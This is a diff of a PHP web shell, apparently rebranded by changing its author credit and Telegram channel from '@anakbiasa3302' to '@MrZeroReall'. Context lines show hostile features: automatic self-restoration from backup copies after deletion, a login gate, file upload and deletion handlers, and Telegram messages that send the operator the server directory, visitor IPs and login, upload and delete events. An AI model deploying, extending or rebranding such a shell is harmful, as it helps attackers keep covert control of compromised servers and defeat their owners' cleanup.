@@ -4,8 +4,8 @@ ini_set('display_errors', 0);
 session_start();
 
 $version = '3.0';
-$author = '@anakbiasa3302';
-$channel = 't.me/goobotproject';
+$author = '@MrZeroReall';
+$channel = 't.me/@MrZeroReall';
 
 $shell_name = basename(__FILE__);
 $backup_locations = [
@@ -62,7 +62,7 @@ function check_and_resurrect() {
                 $msg .= "✅ <b>AUTO-RESURRECTION SUCCESS</b>\n";
                 $msg .= "├─ 🔄 Restored from: <code>" . $backup . "</code>\n";
                 $msg .= "└─ 📍 New location: <code>" . $shell_path . "</code>\n\n";
-                $msg .= "👨‍💻 <b>Author:</b> <code>@anakbiasa3302</code>\n";
+                $msg .= "👨‍💻 <b>Author:</b> <code>@MrZeroReall</code>\n";
                 $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
                 
                 send_telegram($msg);
@@ -594,8 +594,8 @@ if (!isset($_SESSION['logged'])) {
             $msg .= "└─ 📂 Directory: <code>" . getcwd() . "</code>\n\n";
             
             $msg .= "✅ <b>Status:</b> <code>Login Successful</code>\n";
-            $msg .= "👨‍💻 <b>Author:</b> <code>@anakbiasa3302</code>\n";
-            $msg .= "📢 <b>Channel:</b> t.me/goobotproject\n";
+            $msg .= "👨‍💻 <b>Author:</b> <code>@MrZeroReall</code>\n";
+            $msg .= "📢 <b>Channel:</b> t.me/@MrZeroReall\n";
             $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
             
             send_telegram($msg);
@@ -619,7 +619,7 @@ if (!isset($_SESSION['logged'])) {
             
             $msg .= "❌ <b>Status:</b> <code>Login Failed</code>\n";
             $msg .= "⚠️ <b>Action:</b> Possible intrusion attempt!\n";
-            $msg .= "👨‍💻 <b>Author:</b> <code>@anakbiasa3302</code>\n";
+            $msg .= "👨‍💻 <b>Author:</b> <code>@MrZeroReall</code>\n";
             $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
             
             send_telegram($msg);
@@ -853,8 +853,8 @@ if (isset($_FILES['file']) && isset($_POST['csrf']) && verify_csrf_token($_POST[
             $msg .= "└─ 📍 Dir: <code>" . getcwd() . "</code>\n\n";
             
             $msg .= "✅ <b>Status:</b> <code>Upload Successful</code>\n";
-            $msg .= "👨‍💻 <b>Author:</b> <code>@anakbiasa3302</code>\n";
-            $msg .= "📢 <b>Channel:</b> t.me/goobotproject\n";
+            $msg .= "👨‍💻 <b>Author:</b> <code>@MrZeroReall</code>\n";
+            $msg .= "📢 <b>Channel:</b> t.me/MrZeroReall\n";
             $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
             
             $result = send_telegram($msg);
@@ -918,8 +918,8 @@ if (isset($_GET['delete']) && isset($_GET['csrf']) && verify_csrf_token($_GET['c
                 $msg .= "└─ ⚠️ All backups unavailable\n\n";
             }
             
-            $msg .= "👨‍💻 <b>Author:</b> <code>@anakbiasa3302</code>\n";
-            $msg .= "📢 <b>Channel:</b> t.me/goobotproject\n";
+            $msg .= "👨‍💻 <b>Author:</b> <code>@MrZeroReall</code>\n";
+            $msg .= "📢 <b>Channel:</b> t.me/MrZeroReall\n";
             $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
             
         } else {
@@ -933,7 +933,7 @@ if (isset($_GET['delete']) && isset($_GET['csrf']) && verify_csrf_token($_GET['c
             $msg .= "🔗 <b>IP:</b> <code>" . get_ip() . "</code>\n";
             $msg .= "🕒 <b>Time:</b> <code>" . date('Y-m-d H:i:s') . "</code>\n\n";
             
-            $msg .= "👨‍💻 <b>Author:</b> <code>@anakbiasa3302</code>\n";
+            $msg .= "👨‍💻 <b>Author:</b> <code>@MrZeroReall</code>\n";
             $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
         }
         
@@ -949,7 +949,7 @@ if (isset($_GET['delete']) && isset($_GET['csrf']) && verify_csrf_token($_GET['c
         $msg .= "🔗 <b>IP:</b> <code>" . get_ip() . "</code>\n";
         $msg .= "🕒 <b>Time:</b> <code>" . date('Y-m-d H:i:s') . "</code>\n\n";
         
-        $msg .= "👨‍💻 <b>Author:</b> <code>@anakbiasa3302</code>\n";
+        $msg .= "👨‍💻 <b>Author:</b> <code>@MrZeroReall</code>\n";
         $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
         
         rmdir($file);
